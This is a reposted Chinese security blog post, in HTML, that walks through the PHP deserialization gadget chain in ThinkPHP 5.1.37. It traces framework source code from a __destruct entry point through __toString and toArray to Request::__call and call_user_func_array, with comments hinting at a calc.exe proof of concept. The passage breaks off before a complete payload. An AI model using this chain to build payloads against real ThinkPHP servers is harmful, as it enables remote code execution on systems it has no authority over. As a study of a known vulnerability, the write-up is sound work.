<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP反序列化——ThinkPHP5.1.37反序列化链路构造 | SoulfulVoyager</title><meta name="author" content="Abernethy"><meta name="copyright" content="Abernethy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP反序列化——ThinkPHP5.1.37反序列化链路构造本文转载于https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;6223#toc-2，跟着师傅的文章分析 前置知识 PHP中的namespace命名空间  trait修饰符   Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制 trait这个东西的出现是为了解决php">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP反序列化——ThinkPHP5.1.37反序列化链路构造">
<meta property="og:url" content="https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/index.html">
<meta property="og:site_name" content="SoulfulVoyager">
<meta property="og:description" content="PHP反序列化——ThinkPHP5.1.37反序列化链路构造本文转载于https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;6223#toc-2，跟着师傅的文章分析 前置知识 PHP中的namespace命名空间  trait修饰符   Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制 trait这个东西的出现是为了解决php">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg">
<meta property="article:published_time" content="2025-09-21T16:15:38.364Z">
<meta property="article:modified_time" content="2025-09-22T04:43:42.610Z">
<meta property="article:author" content="Abernethy">
<meta property="article:tag" content="PHP反序列化">
<meta property="article:tag" content="ThinkPHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PHP反序列化——ThinkPHP5.1.37反序列化链路构造",
  "url": "https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/",
  "image": "https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg",
  "datePublished": "2025-09-21T16:15:38.364Z",
  "dateModified": "2025-09-22T04:43:42.610Z",
  "author": [
    {
      "@type": "Person",
      "name": "Abernethy",
      "url": "https://sebastian-alphax.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://sebastian-alphax.github.io/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B7%AF%E6%9E%84%E9%80%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHP反序列化——ThinkPHP5.1.37反序列化链路构造',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SoulfulVoyager</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP反序列化——ThinkPHP5.1.37反序列化链路构造</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化——ThinkPHP5.1.37反序列化链路构造</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-21T16:15:38.364Z" title="Created 2025-09-22 00:15:38">2025-09-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-22T04:43:42.610Z" title="Updated 2025-09-22 12:43:42">2025-09-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ThinkPHP/">ThinkPHP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP反序列化——ThinkPHP5-1-37反序列化链路构造"><a href="#PHP反序列化——ThinkPHP5-1-37反序列化链路构造" class="headerlink" title="PHP反序列化——ThinkPHP5.1.37反序列化链路构造"></a>PHP反序列化——ThinkPHP5.1.37反序列化链路构造</h1><p>本文转载于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6223#toc-2%EF%BC%8C%E8%B7%9F%E7%9D%80%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%E5%88%86%E6%9E%90">https://xz.aliyun.com/news/6223#toc-2，跟着师傅的文章分析</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://1cfh.fun/2025/01/21/WebExploit/Php/%E5%9B%9E%E6%9C%9B-ThinkPHP%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">PHP中的namespace命名空间</a></p>
</li>
<li><p>trait修饰符</p>
</li>
</ul>
<p>Trait 是 PHP 5.4+ 引入的一种代码复用机制，它允许开发者在不同类之间复用方法集合，同时避免了单继承的限制</p>
<p>trait这个东西的出现是为了解决php不支持多继承的问题，一般我们将一些类的公有特性提取出来写成一个trait,然后如果某个类想要使用trait中的东西，只需要使用use关键字把这个trait包含进来就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">trait MyTrait &#123;</span><br><span class="line">    public function traitMethod() &#123;</span><br><span class="line">        echo &quot;Trait method called&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyClass &#123;</span><br><span class="line">    use MyTrait;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new MyClass();</span><br><span class="line">$obj-&gt;traitMethod(); // 输出: Trait method called</span><br></pre></td></tr></table></figure>

<h2 id="反序列化链路分析"><a href="#反序列化链路分析" class="headerlink" title="反序列化链路分析"></a>反序列化链路分析</h2><ul>
<li>反序列化的入口点</li>
</ul>
<p>__wakeup&#x20;</p>
<p>__destruct&#x20;</p>
<p>这里找到thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</p>
<p>![](.&#x2F;PHP反序列化——ThinkPHP5.1.37反序列化链路构造&#x2F;1280X1280 (1)-1758516188418-1.png)</p>
<p>&#x20;    跟进removefiles()</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">function</span> <span class="function"><span class="title">removeFiles</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    foreach (<span class="variable">$this</span>-&gt;files as <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            @<span class="built_in">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了file_exists（）函数，函数参数$filename在这里当作string类型处理，因此这里会调用_tostring()魔术方法。</p>
<p>全局搜索_tostring方法</p>
<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-1.png"></p>
<p>跟进thinkphp&#x2F;library&#x2F;think&#x2F;Collection.php中，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function toJson($options = JSON_UNESCAPED_UNICODE)</span><br><span class="line">&#123;</span><br><span class="line">    return json_encode($this-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进ToJson方法，json_encode($this-&gt;toArray(), $options);调用了toArray方法。</p>
<p>在该方法中找到$可控变量-&gt;方法(参数可控)这样一个利用点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image-2.png"></p>
<p>其中$relation要可控，visible方法在$relation类中不存在，这样才能去调用$relation类的_call魔术方法，$name参数也要可控，tips这里的name参数是一个数组。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$relation</span> = <span class="variable">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">    <span class="variable">$relation</span> = <span class="variable">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析$relation变量，跟进$this-&gt;getRelation($key);方法，返回为空</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> getRelation(<span class="variable">$name</span> = null)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;relation;</span><br><span class="line">    &#125; elseif (array_key_exists(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入if分分支，接着分析$relation &#x3D; $this-&gt;getAttr($key);</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> getAttr(<span class="variable">$name</span>, &amp;<span class="variable">$item</span> = null)  //<span class="variable">$name</span> = <span class="variable">$key</span> = <span class="string">&#x27;lin&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable">$this</span>-&gt;getData(<span class="variable">$name</span>);</span><br><span class="line">    &#125; catch (InvalidArgumentException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$value</span>    = null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检测属性获取器</span><br><span class="line">    <span class="variable">$fieldName</span> = Loader::parseName(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$method</span>    = <span class="string">&#x27;get&#x27;</span> . Loader::parseName(<span class="variable">$name</span>, 1) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$notFound</span> &amp;&amp; <span class="variable">$relation</span> = <span class="variable">$this</span>-&gt;isRelationAttr(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$modelRelation</span> = <span class="variable">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">            <span class="variable">$value</span>         = <span class="variable">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure</span> = <span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">        <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125; elseif (method_exists(<span class="variable">$this</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$notFound</span> &amp;&amp; <span class="variable">$relation</span> = <span class="variable">$this</span>-&gt;isRelationAttr(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$modelRelation</span> = <span class="variable">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">            <span class="variable">$value</span>         = <span class="variable">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$value</span>, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125; elseif (isset(<span class="variable">$this</span>-&gt;<span class="built_in">type</span>[<span class="variable">$name</span>])) &#123;</span><br><span class="line">        // 类型转换</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;readTransform(<span class="variable">$value</span>, <span class="variable">$this</span>-&gt;<span class="built_in">type</span>[<span class="variable">$name</span>]);</span><br><span class="line">    &#125; elseif (<span class="variable">$this</span>-&gt;autoWriteTimestamp &amp;&amp; in_array(<span class="variable">$name</span>, [<span class="variable">$this</span>-&gt;createTime, <span class="variable">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$this</span>-&gt;autoWriteTimestamp) &amp;&amp; in_array(strtolower(<span class="variable">$this</span>-&gt;autoWriteTimestamp), [</span><br><span class="line">            <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>,</span><br><span class="line">        ])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;formatDateTime(<span class="variable">$this</span>-&gt;dateFormat, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;formatDateTime(<span class="variable">$this</span>-&gt;dateFormat, <span class="variable">$value</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; elseif (<span class="variable">$notFound</span>) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;getRelationAttribute(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里进一步调用$value    &#x3D; $this-&gt;getData($name);，进入到getData($name)函数，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>) //$<span class="title">name</span> = $<span class="title">key</span> = &#x27;<span class="title">lin</span>&#x27;</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123; <span class="comment">//查找$name是否为data数组里的键名，因为data可控，在poc里定义为$this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; 所以存在</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];  <span class="comment">//返回结果为new Request()</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以向上返回到toArray函数，<code>$relation</code>的值为<code>$this-&gt;data[$name]</code>，<code>$this-&gt;data[$name]</code>为任意类的实例化对象，即new Request()。具体如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>); <span class="comment">//new Request()-&gt; visible($name) ,$name = [&quot;calc.exe&quot;,&quot;calc&quot;] </span></span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6223#toc-2">https://xz.aliyun.com/news/6223#toc-2</a></p>
<p>下面我们需要寻找一个类满足以下2个条件</p>
<p>1.该类中没有”visible”方法</p>
<p>2.实现了__call方法</p>
<p>直接查找 “public function __call”</p>
<p>一般PHP中的__call方法都是用来进行容错或者是动态调用,所以一般会在__call方法中使用</p>
<p>__call_user_func($method, $args)</p>
<p>__call_user_func_array([$obj,$method], $args)<br>但是 public function __call($method, $args) 我们只能控制 $args,所以很多类都不可以用<br>经过查找发现 thinkphp&#x2F;library&#x2F;think&#x2F;Request.php 中的 __call 使用了一个array取值的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)//$<span class="title">method</span>=<span class="title">visable</span>, $<span class="title">args</span>=[&quot;<span class="title">calc</span>.<span class="title">exe</span>&quot;,&quot;<span class="title">calc</span>&quot;] </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;<span class="comment">//$this-&gt;hook可控</span></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>检查钩子是否存在：检查<code>$this-&gt;hook</code>数组中是否存在以<code>$method</code>为键的条目</p>
</li>
